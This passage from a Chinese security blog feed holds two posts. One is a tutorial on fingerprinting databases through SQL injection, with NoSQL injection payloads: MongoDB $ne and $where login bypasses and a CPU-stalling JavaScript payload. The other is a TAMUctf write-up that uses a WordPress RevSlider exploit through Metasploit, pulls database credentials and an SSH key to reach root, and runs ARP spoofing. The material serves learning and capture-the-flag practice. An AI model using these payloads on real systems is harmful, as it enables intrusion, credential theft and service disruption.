rel="noopener">https://www.jianshu.com/p/7c745aa026ea</a><br><a href="https://pkg.phpcomposer.com/" target="_blank" rel="noopener">https://pkg.phpcomposer.com/</a><br><a href="https://blog.csdn.net/will5451/article/details/52474581" target="_blank" rel="noopener">https://blog.csdn.net/will5451/article/details/52474581</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      从零开始学习PHP框架之laravel入门
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php框架" scheme="https://museljh.github.io/tags/php%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title>SQL与Nosql注入判断以及Nosql注入入门</title>
    <link href="https://museljh.github.io/2019/03/07/SQL%E4%B8%8ENosql%E6%B3%A8%E5%85%A5%E5%88%A4%E6%96%AD%E4%BB%A5%E5%8F%8ANosql%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8/"/>
    <id>https://museljh.github.io/2019/03/07/SQL与Nosql注入判断以及Nosql注入入门/</id>
    <published>2019-03-07T04:24:41.000Z</published>
    <updated>2019-03-07T04:27:35.534Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然说ctf比赛中主要都是考mysql数据库，但是不可否认同样也有考其他数据库的可能性。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在当今的互联网企业中，最常用的数据库模型主要分为两种，即关系型数据库和非关系型数据库NoSQL。<br>1.常用关系型数据库<br>Oracle数据库</p><blockquote><p>主要的应用企业包括传统大企业、大公司、政府、金融、证券等</p></blockquote><p>MySQL数据库</p><blockquote><p>MySQL被广泛地应用于各大中小型网站中，具有体积小、速度快、总体拥有成本低，且开放源码等特点。</p></blockquote><p>MariaDB数据库</p><blockquote><p>MariaDB数据库管理系统是MySQL数据库的一个分支，主要由开源社区维护，采用GPL授权许可。</p></blockquote><p>SQL Server数据库<br>SQL Server的功能比较全面、效率高，可以作为中型企业或单位的数据库平台。</p><p>Access数据库</p><p>PostgreSQL数据库</p><p>2.非关系型数据库(nosql)<br>Memcached</p><blockquote><p>Memcached是一个开源的、支持高性能、高并发的分布式内存缓存系统，由C语言编写。</p></blockquote><p>redis（key-value）</p><blockquote><p>redis是一个高性能的key-value数据库</p></blockquote><p>MongoDB（document-oriented）</p><blockquote><p>MongoDB是一个介于关系型数据库和非关系型数据库之间的产品，是非关系型数据库当中功能最丰富，最像关系型数据库的一种产品。</p></blockquote><p><img src="https://i.imgur.com/IevDfzk.png" alt=""></p><h3 id="判断数据库"><a href="#判断数据库" class="headerlink" title="判断数据库"></a>判断数据库</h3><h4 id="一-关系型数据库"><a href="#一-关系型数据库" class="headerlink" title="一.关系型数据库"></a>一.关系型数据库</h4><p>1.法一</p><blockquote><p><a href="http://www.test.com/search.php?name=zhutougg" target="_blank" rel="noopener">http://www.test.com/search.php?name=zhutougg</a></p></blockquote><p>假设你已经找到了一个类似如上这样string型注入，我们可以通过利用 +、||、 等，构造如下payload（虽然我觉得这个方法没什么作用）</p><blockquote><p><a href="http://www.test.com/search.php?name=zhutou&#39;+&#39;gg" target="_blank" rel="noopener">http://www.test.com/search.php?name=zhutou&#39;+&#39;gg</a></p></blockquote><p><img src="https://i.imgur.com/HdcXZWx.png" alt=""></p><p>以mysql为例子只有，<code>select &#39;some&#39; &#39;thing&#39;</code>或者    <code>select concat(&#39;some&#39;,&#39;thing&#39;)</code> 才会得到数据，若使用其他数据库的脚本就会返回空。<br>mysql数据库使用 mysql脚本<code>select &#39;some&#39; &#39;thing&#39;</code><br><img src="https://i.imgur.com/hWNXO6K.png" alt=""></p><p>mysql数据库使用oracle脚本<code>select &#39;some&#39;||&#39;thing&#39;</code><br><img src="https://i.imgur.com/b21D4ZH.png" alt=""></p><p>其它同理。</p><p>2.法二</p><p>可以利用数据库的一些特有的返回整型结果的函数来判断数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SQLServer@@pack_received</span><br><span class="line">                @@rowcount</span><br><span class="line">MySQL        connection_id()</span><br><span class="line">                last_insert_id()</span><br><span class="line">                row_count()</span><br><span class="line">Oracle        BITAND(1,1)</span><br><span class="line">PostgreSQLselect extract(dow from now())</span><br></pre></td></tr></table></figure><p>同样是MySQL数据库 使用 select connection_id()<br><img src="https://i.imgur.com/kyp9GD0.png" alt=""><br>使用 select extract(dow from now())<br><img src="https://i.imgur.com/LjbXwyI.png" alt=""></p><p>法三、<br>通过某些特有的函数判断，比如SQLServer的 waitfor delay 比如PostgreSQL的pg_sleep()<br> 基于时间的<br> 在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。</p><p>在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型</p><p>在mysql之中，可以使用sleep(5)注入参数之中，造成延迟来判断数据库类型</p><p>法四：</p><ul><li><p>Access:</p><p>  <code>and (select count(*) from MSysAccessObjects)&gt;0</code><br><code>and exists(select count(*) from 表)</code><br> 返回正常说明是access<br><code>ID=1 and (select count(*) from sysobjects)&gt;0</code><br>返回异常</p></li></ul><p><code>ID=1 and(select count(*) fromm sysobjects)&gt;0</code><br>返回异常</p><p><del>* SQLserver:<br>    <code>and (select count(*) from sysobjects) &gt;0</code><br>    返回正常说明是mssql</del><br>sqlserver：<br><code>http://www.wenkuxiazai.com/showdetail.asp?id=49 and user&gt;0</code></p><p>MySQL:<br>    <code>and length(user())&gt;0</code><br>    <code>id=2 CHAR(97,110,100,32,49,61,49)</code><br>    <code>id=2 and version() &gt;0</code></p><p>返回正常说明是MySQL</p><p>ORACLE：<br><code>ID=1 and &#39;1&#39; || &#39;1&#39; = &#39;11</code></p><p><code>ID=1 and 0 &lt;&gt; (select count(*) from dual)</code></p><p><code>ID=1 CHR(97) || CHR(110) || CHR(100) || CHR(32) || CHR(49) || CHR(61) || CHR(49)</code></p><p>返回正常说明是ORACLE</p><p>MSSQL：<br><code>ID=1 and (select count(*) from sysobjects)&gt;0返回正常</code><br><code>ID=1 and (select count(*) fromm sysobjects)&gt;0返回异常</code><br><code>ID=1 and left(version(),1)=5%23//红色字体也可能是4</code><br><code>ID=1 and exists(select id from sysobjects)</code><br><code>ID=1 and length(user)&gt;0</code><br><code>ID=1 CHAR(97) +CHAR(110) +CHAR(100) +CHAR(32) +CHAR(49) +CHAR(61) +CHAR(49)</code></p><p>法五：<br>其实我们还可以利用数据库的注释符来判断<br><img src="https://i.imgur.com/6aXuFuH.png" alt=""></p><h4 id="二、非关系型数据库"><a href="#二、非关系型数据库" class="headerlink" title="二、非关系型数据库"></a>二、非关系型数据库</h4><p>如何识别数据库使用的是nosql数据库呢？<br>法一：<br>使用nosqlmap或者nosqlattack等自动化工具<br>法二：直接使用针对于nosql的常见注入脚本<br>法三：根据情况判断。比如网站有信息泄露之类的。</p><p>NoSQL(NoSQL = Not Only SQL )，意即”不仅仅是SQL”。<br>使用比较多的Nosql数据库为MongoDB，Nosql在查询的时候采用BSON类型数据，有别于传统的json数据<br>我们先讲解下什么是Bson数据</p><p>那BSON是个啥？BSON Spec官方是这样描述的：<br>BSON（Binary Serialized Document Format）, short for Bin­ary JSON, is a bin­ary-en­coded seri­al­iz­a­tion of JSON-like doc­u­ments.</p><p>举个栗子：<br>json数据</p><blockquote><p>{ “key”: “value” }</p></blockquote><p>将它转换成BSON数据：</p><blockquote><p> 0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5<br>+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+<br>|14 00 00 00|02|6b 65 79 00|06 00 00 00 76 61 6c|<br>+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+–+<br>|75 65 00|00|<br>+–+–+–+–+</p></blockquote><p>大概就是json的摘要，类似于将json二进制数据进行序列化<br>感兴趣的可以看</p><blockquote><p><a href="http://liehu.tass.com.cn/archives/1294" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/1294</a></p></blockquote><p>其实这么一看好像nosql安全性挺高的，然而却不是这样，为了保持高速的访问，nosql有着许多安全问题。</p><p>主要问题有Nosql未授权访问。<br>PHP:<br>1.以查询条件{ “password”: @USER_INPUT }为例，在不知道密码的情况下，可以使用{ “password”: { “$ne”: 1 } }绕过。</p><p>2.永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制，主要造成这个原因是由于MongoDB之类的nosql数据库对用户输入没有做任何校验，<br>感兴趣可以看</p><blockquote><p><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">https://www.anquanke.com/post/id/97211</a></p></blockquote><p>以登入界面为例子，直接使用以下payload便可以直接登入。<br>payload:<br><code>username[$ne]=1&amp;password[$ne]=1</code></p><p>感觉这个和未授权访问貌似讲的是同会事<br>3.NoSQL联合查询注入</p><p>string query =”{ username: ‘“ + post_username + “‘, password: ‘“ + post_password + “‘ }”</p><p>payload:</p><p>username=tolkien’, $or: [ {}, { ‘a’:’a&amp;password=’ } ]</p><p>JavaScript:<br>在MongoDB中 $where操作符是可以执行JavaScript语句的<br>payload</p><blockquote><p>username=1&amp;password=1;return true;</p></blockquote><blockquote><p>username=1&amp;password=1;(function(){var%20date%20=%20new%20Date();%20do{curDate%20=%20new%20Date();}while(curDate-date%3C5000);%20return%20Math.max();})();</p></blockquote><p>这个payload可以让MongoDB所在服务器CPU瞬间飙升，持续5秒。<br>5.Node.js中的NoSQL注入<br>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;: null&#125;&#125;</span><br></pre></td></tr></table></figure><p>其实就是把它数据变成json。<br>靶场</p><blockquote><p><a href="https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035" target="_blank" rel="noopener">https://pockr.org/bug-environment/detail?environment_no=env_75b82b98ffedbe0035</a></p></blockquote><p>wp</p><blockquote><p><a href="https://www.anquanke.com/post/id/95844" target="_blank" rel="noopener">https://www.anquanke.com/post/id/95844</a></p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.jianshu.com/p/80d7e16c0185" target="_blank" rel="noopener">https://www.jianshu.com/p/80d7e16c0185</a><br><a href="https://db-engines.com/en/ranking" target="_blank" rel="noopener">https://db-engines.com/en/ranking</a><br><a href="https://www.jianshu.com/p/995f57e36918" target="_blank" rel="noopener">https://www.jianshu.com/p/995f57e36918</a><br><a href="https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/" target="_blank" rel="noopener">https://wsygoogol.github.io/2016/06/18/sql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/</a><br><a href="https://www.jianshu.com/p/995f57e36918" target="_blank" rel="noopener">https://www.jianshu.com/p/995f57e36918</a><br><a href="https://www.bugbank.cn/q/article/59899f4b9a4253dc14efe543.html" target="_blank" rel="noopener">https://www.bugbank.cn/q/article/59899f4b9a4253dc14efe543.html</a><br><a href="https://xz.aliyun.com/t/2075" target="_blank" rel="noopener">https://xz.aliyun.com/t/2075</a><br><a href="https://www.anquanke.com/post/id/97211" target="_blank" rel="noopener">https://www.anquanke.com/post/id/97211</a><br><a href="http://liehu.tass.com.cn/archives/1294" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/1294</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      SQL与Nosql注入判断以及Nosql注入入门。
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="sql注入" scheme="https://museljh.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>从tamuctf Network中学习内网渗透</title>
    <link href="https://museljh.github.io/2019/03/06/tamuctf%20Network%E9%83%A8%E5%88%86wp/"/>
    <id>https://museljh.github.io/2019/03/06/tamuctf Network部分wp/</id>
    <published>2019-03-06T14:21:24.000Z</published>
    <updated>2019-03-06T15:07:20.390Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这个是tamuctf内网穿透的题目,话说tamuctf居然是一个校赛…</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>环境搭建</p><blockquote><p>apt install openvpn</p></blockquote><blockquote><p>openvpn –config ${challenge}.ovpn<br>这里的${challenge}是指具体文件名字</p></blockquote><h3 id="Stop-and-Listen"><a href="#Stop-and-Listen" class="headerlink" title="Stop and Listen"></a>Stop and Listen</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Sometimes you just need to stop and listen.</span><br><span class="line"></span><br><span class="line">This challenge is an introduction to our network exploit challenges, which are hosted over OpenVPN.</span><br><span class="line"></span><br><span class="line">Instructions:</span><br><span class="line"></span><br><span class="line">Install OpenVPN. Make sure to install the TAP driver.</span><br><span class="line">Debian (Ubuntu/Kali) linux CLI: apt install openvpn</span><br><span class="line">Windows GUI installer</span><br><span class="line">Obtain your OpenVPN configuration in the challenge modal.</span><br><span class="line">You will obtain a separate config for each challenge containing connection info and certificates for authentication.</span><br><span class="line">Launch OpenVPN:</span><br><span class="line">CLI: sudo openvpn --config $&#123;challenge&#125;.ovpn</span><br><span class="line">Windows GUI: Place the config file in %HOMEPATH%\OpenVPN\config and right-click the VPN icon on the status bar, then select the config for this challenge</span><br><span class="line">The virtual tap0 interface will be assigned the IP address 172.30.0.14/28 by default. If multiple team members connect you will need to choose a unique IP for both.</span><br><span class="line"></span><br><span class="line">The standard subnet is 172.30.0.0/28, so give that a scan ;)</span><br><span class="line"></span><br><span class="line">If you have any issues, please let me (nategraf) know in the Discord chat</span><br><span class="line"></span><br><span class="line">Some tools to get started:</span><br><span class="line"></span><br><span class="line">Wireshark</span><br><span class="line">tcpdump</span><br><span class="line">nmap</span><br><span class="line">ettercap</span><br><span class="line">betterca</span><br></pre></td></tr></table></figure><p>The standard subnet is 172.30.0.0/28, so give that a scan ;<br>根据题目提示我们首先</p><blockquote><p>nmap -vvv 172.30.0.0/28</p></blockquote><p>并没有发现什么可疑的端口<br>根据题目提示使用wireshark进行流量分析，先在服务器进行流量抓取</p><blockquote><p>tcpdump -i tap0 -w listen.pcay</p></blockquote><p>耐心等会<br><img src="https://i.imgur.com/eoDJD1G.png" alt=""></p><h2 id="Wordpress"><a href="#Wordpress" class="headerlink" title="Wordpress"></a>Wordpress</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">I setup my own Wordpress site!</span><br><span class="line">I love that there are so many plugins. My favorite is Revolution Slider. Even though it&apos;s a little old it doesn&apos;t show up on wpscan!</span><br><span class="line"></span><br><span class="line">Please give it about 30 seconds after connecting for everything to setup correctly.</span><br><span class="line">The flag is in /root/flag.txt</span><br><span class="line"></span><br><span class="line">Difficulty: medium</span><br></pre></td></tr></table></figure><p>根据题目提示<br>应该是wordpress的某个插件出现问题</p><blockquote><p>My favorite is Revolution Slider， Even though it’s a little old it doesn’t show up on wpscan</p></blockquote><p>wpscan是wordpress的专门扫描器，题目虽然说用wpscan扫不出但是，估计就是这个Revolution Slider有问题了。</p><p>并且flag  在 /root/flag.txt中<br>我们再次</p><blockquote><p>openvpn –config wordpress.ovpn </p></blockquote><p>依旧nmap 一波</p><blockquote><p>nmap -vvv 172.30.0.0/28</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.30.0.2</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">3306/tcp open  mysql   syn-ack ttl 64</span><br><span class="line">MAC Address: 02:42:3D:35:F3:46 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.3</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 64</span><br><span class="line">80/tcp open  http    syn-ack ttl 64</span><br><span class="line">MAC Address: 02:42:2E:E8:F8:89 (Unknown)</span><br></pre></td></tr></table></figure><p>可以知道172.30.0.3的80端口有开，我们使用wpscan扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm wpscanteam/wpscan --url 172.30.0.3 --enumerate</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[+] revslider</span><br><span class="line"> | Location: http://172.30.0.3/wp-content/plugins/revslider/</span><br><span class="line"> |</span><br><span class="line"> | Detected By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 2 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Slider Revolution Local File Disclosure</span><br><span class="line"> |     Fixed in: 4.1.5</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7540</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1579</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/34511/</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/36039/</span><br><span class="line"> |      - http://blog.sucuri.net/2014/09/slider-revolution-plugin-critical-vulnerability-being-exploited.html</span><br><span class="line"> |      - http://packetstormsecurity.com/files/129761/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WordPress Slider Revolution Shell Upload</span><br><span class="line"> |     Fixed in: 3.0.96</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpvulndb.com/vulnerabilities/7954</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/35385/</span><br><span class="line"> |      - https://whatisgon.wordpress.com/2014/11/30/another-revslider-vulnerability/</span><br><span class="line"> |      - https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_revslider_upload_execute</span><br><span class="line"> |</span><br><span class="line"> | The version could not be determined.</span><br></pre></td></tr></table></figure><p>有两个攻击点，先看看第一个</p><blockquote><p><a href="https://www.exploit-db.com/exploits/34511" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/34511</a></p></blockquote><p>漏洞是这么形容的</p><blockquote><p>Mulitple WordPress Themes - ‘admin-ajax.php?img’ Arbitrary File Download</p></blockquote><p>意思为这个漏洞为任意文件下载漏洞，给出了POP链</p><p>POC </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://victim/wp-admin/admin-ajax.php?action=revslider_show_image&amp;img=../wp-config.php</span><br></pre></td></tr></table></figure><p>我们试试能不能读取文件。尝试了下不可以，因该是权限不足的原因。</p><p>试试第二个，使用msf</p><p><img src="https://i.imgur.com/n7ScENE.png" alt=""></p><p>其实并不用这么麻烦的，这里只是介绍下wpscan其实一开始就给我们说了<br><img src="https://i.imgur.com/p5YVike.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search wp_revslider_upload_execute</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                             Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                             ---------------  ----       -----  -----------</span><br><span class="line">   exploit/unix/webapp/wp_revslider_upload_execute  2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability</span><br></pre></td></tr></table></figure><p>所以msf直接search Revolution就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search Revolution</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                             Disclosure Date  Rank       Check  Description</span><br><span class="line">   ----                                             ---------------  ----       -----  -----------</span><br><span class="line">   exploit/unix/webapp/wp_revslider_upload_execute  2014-11-26       excellent  Yes    WordPress RevSlider File Upload and Execute Vulnerability</span><br></pre></td></tr></table></figure><p>其实是达到了相同的效果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use unix/webapp/wp_revslider_upload_execute</span><br><span class="line">msf5 exploit(unix/webapp/wp_revslider_upload_execute) &gt; set RHOSTS 172.30.0.3</span><br><span class="line">RHOSTS =&gt; 172.30.0.3</span><br><span class="line">msf5 exploit(unix/webapp/wp_revslider_upload_execute) &gt; exploit</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br></pre></td></tr></table></figure><p>我们成功得到一个shell</p><p>读取下flag<br>发现权限不足<br><img src="https://i.imgur.com/IrEYXKp.png" alt=""></p><p>ls下发现目录里note.txt很可疑<br><img src="https://i.imgur.com/WkPYCw5.png" alt=""><br>cat 以下 发现<br><img src="https://i.imgur.com/kL8cTVa.png" alt=""><br>意思是要我们去数据库中获取ssh密钥</p><p>我们再看下当前目录，尝试下cat wp-config.php</p><p>然后发现数据库信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">define(&apos;DB_NAME&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database username */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;wordpress&apos;);</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;0NYa6PBH52y86C&apos;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 172.30.0.2 -u wordpress --password=&quot;0NYa6PBH52y86C&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/backup/id_rsa&apos;);</span><br><span class="line">[...]</span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>创建一个rsa.key文件，并给他一定权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# touch rsa.key</span><br><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# vim rsa.key</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# chmod 400 rsa.key </span><br><span class="line">root@iZwz9hyvb5rjm3oubt8o15Z:~# ssh -i rsa.key root@172.30.0.3</span><br><span class="line"></span><br><span class="line">Welcome to Ubuntu 14.04 LTS (GNU/Linux 4.4.0-141-generic x86_64)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root@apacheword:~# </span><br><span class="line">$ chmod 400 rsa.key</span><br><span class="line">$ ssh -i rsa.key root@172.30.0.3</span><br></pre></td></tr></table></figure><p>成功获取到一个root权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@apacheword:~# </span><br><span class="line">root@apacheword:~# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@apacheword:~# cat flag.txt  </span><br><span class="line">gigem&#123;w0rd_pr3ss_b3st_pr3ss_409186FC8E2A45FE&#125;</span><br></pre></td></tr></table></figure><h3 id="Calculator"><a href="#Calculator" class="headerlink" title="Calculator"></a>Calculator</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Using a teletype network protocol from the 70s to access a calculator from the 70s? Far out!</span><br><span class="line"></span><br><span class="line">Note to new players: You won&apos;t see anything in Wireshark / tcpdump when you initially connect. (i.e. packets are sent unicast on a bridged network)</span><br><span class="line"></span><br><span class="line">Wireshark</span><br><span class="line">tcpdump</span><br><span class="line">ettercap</span><br><span class="line">Difficulty: easy</span><br><span class="line"></span><br><span class="line">2/23 8:56 am: Added suggested tools</span><br></pre></td></tr></table></figure><p>nmap扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 172.30.0.2</span><br><span class="line">Host is up (0.33s latency).</span><br><span class="line">Not shown: 999 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">23/tcp open  telnet</span><br><span class="line">MAC Address: 02:42:4E:8E:83:1A (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.3</span><br><span class="line">Host is up (0.34s latency).</span><br><span class="line">All 1000 scanned ports on 172.30.0.3 are closed</span><br><span class="line">MAC Address: 02:42:3B:45:EB:29 (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 172.30.0.14</span><br><span class="line">Host is up (0.0000020s latency).</span><br><span class="line">All 1000 scanned ports on 172.30.0.14 are closed</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i tap0 -t 172.30.0.2  172.30.0.3</span><br></pre></td></tr></table></figure><p>直接使用arpspoof进行arp欺骗，再使用wireshark进行抓包尝试读取telnet的密码进行登入，但是并未获得想要的数据。</p><p><img src="https://i.imgur.com/dtyLMfa.png" 